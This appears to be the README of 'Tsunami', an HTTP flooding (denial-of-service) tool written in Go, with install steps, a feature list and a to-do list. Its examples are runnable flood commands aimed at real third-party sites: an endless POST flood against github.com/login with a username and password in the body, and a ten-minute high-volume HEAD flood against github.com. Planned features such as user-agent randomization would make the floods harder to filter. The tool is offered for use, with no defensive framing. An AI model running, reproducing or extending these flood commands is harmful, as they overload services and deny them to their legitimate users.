# Tsunami
An advanced HTTP flooder written in Golang

__This project is huge WIP__

## Basic Usage
```bash
./tsunami http://example.com --threads 100
```

## Help
```bash
./tsunami --help
```

## Quick install
```bash
git clone https://github.com/ammario/tsunami
cd tsunami
export GOPATH=`pwd`
go get ./...
go build
```

## Features
- Live attack stats
- Customizable mutlithreading
- HTTPS support __(Note: Certificates aren't verified for performance)__

## Examples
### Low volume POST flood lasting forever
```bash
./tsunami -w 2 "https://github.com/login" POST "username=Ammar&password=g1thuB123"
```
### High volume HEAD flood lasting for 10 minutes
```bash
./tsunami -w 100 -s 600 "https://github.com/" HEAD
```

## Todo
 - Dynamic tokens (E.g {RANDOM_STRING}, {RANDOM_INT})
 - User Agent randomization
 - All HTTP methods
 - Custom headers
 - Pretty display of attack stats
 - ???